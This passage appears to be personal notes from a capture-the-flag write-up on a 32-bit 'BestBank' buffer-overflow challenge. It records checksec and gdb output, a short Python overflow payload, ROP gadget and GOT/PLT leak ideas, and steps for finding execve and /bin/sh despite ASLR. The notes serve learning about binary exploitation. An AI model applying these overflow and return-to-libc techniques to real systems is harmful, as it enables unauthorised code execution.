    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      No PIE (0x8048000)
    RWX:      Has RWX segments
```

```
$ checksec --file bank
[*] '/home/zionperez/Desktop/playgrounds/lhc/Pwn/BestBank/bank'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      No PIE (0x8048000)
    RWX:      Has RWX segments
```
Stack Canaries are a secret value placed on the stack which changes every time the program is started. Prior to a function return, the stack canary is checked and if it appears to be modified, the program exits immeadiately.
https://ctf101.org/binary-exploitation/stack-canaries/

The last abbreviation is PIE, meaning Position Independent Executable. A No PIE application tells the loader which virtual address it should use (and keeps its memory layout quite static). Hence, attacks against this application know up-front how the virtual memory for this application is (partially) organized.
http://blog.siphos.be/2011/07/high-level-explanation-on-some-binary-executable-security/


```
Stack
+------------------+
|   arguments      |
+------------------+
|   stack ptr      |
+------------------+
|   locals?        |
+------------------+
```
Software security - Return Oriented Programming - ROP
https://www.youtube.com/watch?v=XZa0Yu6i_ew



0x08049275 : cld ; leave ; ret

We already overwrote the base pointer. The leave command stores the base pointer into the rsp. then pops top of stack into rbp!!
Then RETURNS

```
   0x804926d:	adc    BYTE PTR [eax+0x0],bh
   0x8049273:	mov    ebx,DWORD PTR [ebp-0x4]
   0x8049276:	leave  
=> 0x8049277:	ret  


>>> info breakpoints
Num     Type           Disp Enb Address    What
1       breakpoint     keep n   0xf7e3bbb5 <__isoc99_scanf+5>
2       breakpoint     keep n   0xf7e3bc6e <__isoc99_scanf+190>
5       breakpoint     keep n   0x08049208 
6       breakpoint     keep y   0x08049277 
	breakpoint already hit 1 time
8       breakpoint     keep y   0x0804926d 
9       breakpoint     keep y   0x08049276 <======= most important breakpoint

```

Incorrect captcha leads to:
```
0x08049276  ? leave   <=====
!0x08049277  ? ret
```


```python
deadbeef = b'\xef\xbe\xad\xde'
payload = b'1 ' + b'A'*1012 + deadbeef
sys.stdout.buffer.write(payload)
```

gdb:
```
Breakpoint 9, 0x08049276 in ?? ()
>>> x/$ebp
0xffffd058:	0xdeadbeef
>>> si
```
leave is exactly equivalent to:
mov  esp,ebp
pop  ebp            ; pop top of stack and increment $esp by 4 bytes (32bits)

which is:
esp = ebp + 4


```
CREATE A PYTHON SCRIPT THAT RELAYS YOUR COMMANDS!!
```

First remote root exploit - bin 0x1D
https://www.youtube.com/watch?v=HAN8Qun26cQ

```
>>> info breakpoints
Num     Type           Disp Enb Address    What
1       breakpoint     keep y   0x08049276 
	breakpoint already hit 1 time
```

Idea: info leak the stack with printf

```
>>> info functions execve
All functions matching regular expression "execve":

Non-debugging symbols:
0xf7e975b0  execve
0xf7e975e0  fexecve
```

$ grep -R -a -b -o /bin/sh /lib/i386-linux-gnu/libc.so.6
1564879:/bin/sh   <==== offset


https://jvns.ca/blog/2018/04/28/debugging-a-segfault-on-linux/
```
ulimit -c unlimited
```
https://www.youtube.com/watch?v=GV10eIuPs9k


core dump:
```
<http://www.gnu.org/software/gdb/documentation/>.
For help, type "help".
Type "apropos word" to search for commands related to "word"...
Reading symbols from bank...(no debugging symbols found)...done.
[New LWP 2648]
Core was generated by `./bank'.
Program terminated with signal SIGSEGV, Segmentation fault.
#0  0xffffd280 in ?? ()
>>> x/$esp
0xffdf2e00:                                          <======== stack address



For help, type "help".
Type "apropos word" to search for commands related to "word"...
Reading symbols from bank...(no debugging symbols found)...done.
[New LWP 5317]
Core was generated by `./bank'.
Program terminated with signal SIGSEGV, Segmentation fault.
#0  0xffdf2ff4 in ?? ()
```


plt functions
```
(gdb) info functions @plt
All functions matching regular expression "@plt":

Non-debugging symbols:
0x08049030  setbuf@plt
0x08049040  printf@plt
0x08049050  puts@plt
0x08049060  exit@plt
0x08049070  __libc_start_main@plt
0x08049080  __isoc99_scanf@plt
0x08049090  strncmp@plt
0xf7fd6a30  _dl_catch_exception@plt
0xf7fd6a40  malloc@plt
0xf7fd6a50  _dl_signal_exception@plt
0xf7fd6a60  calloc@plt
0xf7fd6a70  realloc@plt
0xf7fd6a80  _dl_signal_error@plt
0xf7fd6a90  _dl_catch_error@plt
0xf7fd6aa0  free@plt
0xf7df0550  _Unwind_Find_FDE@plt
0xf7df0560  realloc@plt
0xf7df0570  *ABS*@plt
0xf7df0580  memalign@plt
0xf7df0590  _dl_exception_create@plt
0xf7df05a0  *ABS*@plt
0xf7df05b0  __tunable_get_val@plt
0xf7df05c0  *ABS*@plt
0xf7df05d0  _dl_find_dso_for_object@plt
0xf7df05e0  calloc@plt
0xf7df05f0  ___tls_get_addr@plt
0xf7df0600  malloc@plt
0xf7df0608  free@plt

(gdb) info functions execve
All functions matching regular expression "execve":

Non-debugging symbols:
0xf7e975b0  execve
0xf7e975e0  fexecve
```


Leak data via printf
https://www.youtube.com/watch?v=Y9kUWsyyChk

Idea: 
```
Trying to print "hello" via printf:

>>> x/100s $esp
...
0xffffd340:	"hello"

Eax buffer contains the start address to the hello string:
eax 0xffffd340

What if after the overflow, jump program to this rop gadget:
0x080494e3 : mov eax, dword ptr [esp] ; ret

^ Above moves what $esp points to into $eax. printf uses $eax as the pointer for the first variable

Then after that go to printf
```


New idea: get checkBalance function to print something wacky off the stack:
```
void checkBalance(void)
{
  int stackPointer;
  
  stackPointer = getStackPointer();
                    // 0xE41: location of "Your current balance is:" strings
                    // 0x2CB1: location of accountBalance
  printf((char *)(stackPointer + 0xe41),*(undefined4 *)(stackPointer + 0x2cb1));
  return;
}
```

```
0x0804931e  ? test   eax,eax
if (captchaResult != 0) {

>>> x/ $ebx+0x30
0x804c030:	0x000001f4      // 0x1f4 = 500

>>> x/ $ebp-0xc
0xffffd07c:	0x0000000a      // a = 10, which is the deposit amount I entered
```

finding /bin/sh
https://stackoverflow.com/questions/6637448/how-to-find-the-address-of-a-string-in-memory-using-gdb
```
>>> info proc map
process 20880
Mapped address spaces:

	Start Addr   End Addr       Size     Offset objfile
	 0x8048000  0x804b000     0x3000        0x0 /home/zionperez/Desktop/playgrounds/lhc/Pwn/BestBank/bank
	 0x804b000  0x804c000     0x1000     0x2000 /home/zionperez/Desktop/playgrounds/lhc/Pwn/BestBank/bank
	 0x804c000  0x804d000     0x1000     0x3000 /home/zionperez/Desktop/playgrounds/lhc/Pwn/BestBank/bank
	0xf7dd8000 0xf7fad000   0x1d5000        0x0 /lib/i386-linux-gnu/libc-2.27.so
	0xf7fad000 0xf7fae000     0x1000   0x1d5000 /lib/i386-linux-gnu/libc-2.27.so
	0xf7fae000 0xf7fb0000     0x2000   0x1d5000 /lib/i386-linux-gnu/libc-2.27.so
	0xf7fb0000 0xf7fb1000     0x1000   0x1d7000 /lib/i386-linux-gnu/libc-2.27.so
	0xf7fb1000 0xf7fb4000     0x3000        0x0 
	0xf7fd0000 0xf7fd2000     0x2000        0x0 
	0xf7fd2000 0xf7fd5000     0x3000        0x0 [vvar]
	0xf7fd5000 0xf7fd6000     0x1000        0x0 [vdso]
	0xf7fd6000 0xf7ffc000    0x26000        0x0 /lib/i386-linux-gnu/ld-2.27.so
	0xf7ffc000 0xf7ffd000     0x1000    0x25000 /lib/i386-linux-gnu/ld-2.27.so
	0xf7ffd000 0xf7ffe000     0x1000    0x26000 /lib/i386-linux-gnu/ld-2.27.so
	0xfffdd000 0xffffe000    0x21000        0x0 [stack]
>>> find 0xf7dd8000,0xf7fb1000,"/bin/sh"
0xf7f560cf
1 pattern found.
>>> x/s 0xf7f560cf
0xf7f560cf:	"/bin/sh"
>>> 

```


ABigPickle03/05/2020
Oh, so you should understand aslr address leaking then no?

```
https://security.stackexchange.com/questions/149035/is-aslr-useless-in-preventing-attacks-such-as-return-to-libc-in-linux
Is ASLR useless in preventing attacks such as return-to-libc in linux?
When PIE is not used, the program must rely on a fixed PLT, created during linking, to resolve the addresses of functions in shared libraries.

0x08049050  puts@plt
https://sidsbits.com/Defeating-ASLR-with-a-Leak/#Defeating-ASLR-with-a-Leak
buf += p64(e.plt['puts']) # Return address - call the puts function
buf += p64(e.got['puts']) # Argument to puts - GOT['puts']

>>> disassemble 'puts@plt'
Dump of assembler code for function puts@plt:
   0x08049050 <+0>:	jmp    DWORD PTR ds:0x804c014
   0x08049056 <+6>:	push   0x10
   0x0804905b <+11>:	jmp    0x8049020
End of assembler dump.
>>> x/wx 0x804c014
0x804c014:	0xf7e3fb40
>>> info symbol 0xf7e3fb40
puts in section .text of /lib/i386-linux-gnu/libc.so.6
>>> 
```


So $eax needs to point to the string that will go into puts
```
Breakpoint 4, 0x08049050 in puts@plt ()
>>> x/s $eax
0x804a21e:	"Welcome to the Best Bank!"
```

```
Breakpoint 5, 0x08049040 in printf@plt ()
>>> x/10i 0x08049208
   0x8049208:	add    esp,0x10
   0x804920b:	sub    esp,0x8
   0x804920e:	lea    eax,[ebp-0x3f4]
   0x8049214:	push   eax
   0x8049215:	lea    eax,[ebx-0x1f09]
   0x804921b:	push   eax
   0x804921c:	call   0x8049080 <__isoc99_scanf@plt>
```

```
# Get execve address
$ sudo gdb -p `pidof bank`
>>> info functions execve
...
0xf7e8e5b0  execve
0xf7ddd5b0  execve
0xf7da45b0  execve
  ^^|||^^^ these stay the same
    ^^^ these middle bits change due to ASLR

>>> info proc map
...
	0xf7ce5000 0xf7eba000   0x1d5000        0x0 /lib/i386-linux-gnu/libc-2.27.so
...
	0xf7ebd000 0xf7ebe000     0x1000   0x1d7000 /lib/i386-linux-gnu/libc-2.27.so
...
>>> find 0xf7ce5000,0xf7ebe000,"/bin/sh"
0xf7e630cf
1 pattern found.
>>> x/s 0xf7e630cf
0xf7e630cf:	"/bin/sh"


# found /bin/sh at:
0xf7e630cf      ; now run it again. get a new ASLR address
0xf7f350cf      ; run it again
0xf7ecd0cf      ; 
  ^^|||^^^ these stay the same
    ^^^ these middle bits change due to ASLR
```


```
$ cat /proc/25183/maps
08048000-0804b000 r-xp 00000000 fd:01 2441960                            /home/zionperez/Desktop/playgrounds/lhc/Pwn/BestBank/bank
0804b000-0804c000 r-xp 00002000 fd:01 2441960                            /home/zionperez/Desktop/playgrounds/lhc/Pwn/BestBank/bank
0804c000-0804d000 rwxp 00003000 fd:01 2441960                            /home/zionperez/Desktop/playgrounds/lhc/Pwn/BestBank/bank
^ this section     ^ has write permissions..
f7dae000-f7f83000 r-xp 00000000 fd:01 8130741                            /lib/i386-linux-gnu/libc-2.27.so
f7f83000-f7f84000 ---p 001d5000 fd:01 8130741                            /lib/i386-linux-gnu/libc-2.27.so
f7f84000-f7f86000 r-xp 001d5000 fd:01 8130741                            /lib/i386-linux-gnu/libc-2.27.so
f7f86000-f7f87000 rwxp 001d7000 fd:01 8130741                            /lib/i386-linux-gnu/libc-2.27.so
f7f87000-f7f8a000 rwxp 00000000 00:00 0 
f7fa6000-f7fa8000 rwxp 00000000 00:00 0 
f7fa8000-f7fab000 r--p 00000000 00:00 0                                  [vvar]
f7fab000-f7fac000 r-xp 00000000 00:00 0                                  [vdso]
f7fac000-f7fd2000 r-xp 00000000 fd:01 8130737                            /lib/i386-linux-gnu/ld-2.27.so
f7fd2000-f7fd3000 r-xp 00025000 fd:01 8130737                            /lib/i386-linux-gnu/ld-2.27.so
f7fd3000-f7fd4000 rwxp 00026000 fd:01 8130737                            /lib/i386-linux-gnu/ld-2.27.so
ff9ed000-ffa0e000 rwxp 00000000 00:00 0                                  [stack]
```

LHC{b3st_b4nk_h4s_b33n_pwned-120927!!!}

This challenge took over 7 days to complete..

## Notes to Self

Started this challenge on 05 June 2020. Completed the challenge on 13 June 2020. It took nine (9) days of debugging, learning, and grinding to solve. This is my first buffer-overflow payload-to-shell exploit and I have learned a ton. 

This challenge involved an incredible amount of trial-and-error. However, the solution write-up skips most of these trials and instead details the best path to get to the goal. While the solution is important, it is the journey that makes it memorable and worthwhile. In that journey, I have learned about addrses space layout randomization (ASLR), format string exploits, the global offset table (GOT), the procedure linkage table (PLT), stack canaries, and many other concepts. These concepts and others have been linked in the resources section below.

## Resources
* [Wikipedia: scanf format string][1]
* [GeeksforGeeks: Difference between scanf() and gets() in C][2]
* [GDB Dashboard][3]
* [LiveOverflow: First Exploit! Buffer Overflow with Shellcode - bin 0x0E][4]
* [Shell Storm: Linux x86 execve("/bin/sh")][5]
* [StackOverflow: Assembly "leave" instruction][6]
* [StackOverflow: What is x86 "ret" instruction equivalent to?][7]

[1]:https://en.wikipedia.org/wiki/Scanf_format_string#Vulnerabilities
[2]:https://www.geeksforgeeks.org/difference-between-scanf-and-gets-in-c/
[3]:https://github.com/cyrus-and/gdb-dashboard
[4]:https://youtu.be/HSlhY4Uy8SA
[5]:http://shell-storm.org/shellcode/files/shellcode-811.php
[6]:https://stackoverflow.com/questions/29790175/assembly-x86-leave-instruction/29790275
[7]:https://stackoverflow.com/questions/20129107/what-is-the-x86-ret-instruction-equivalent-to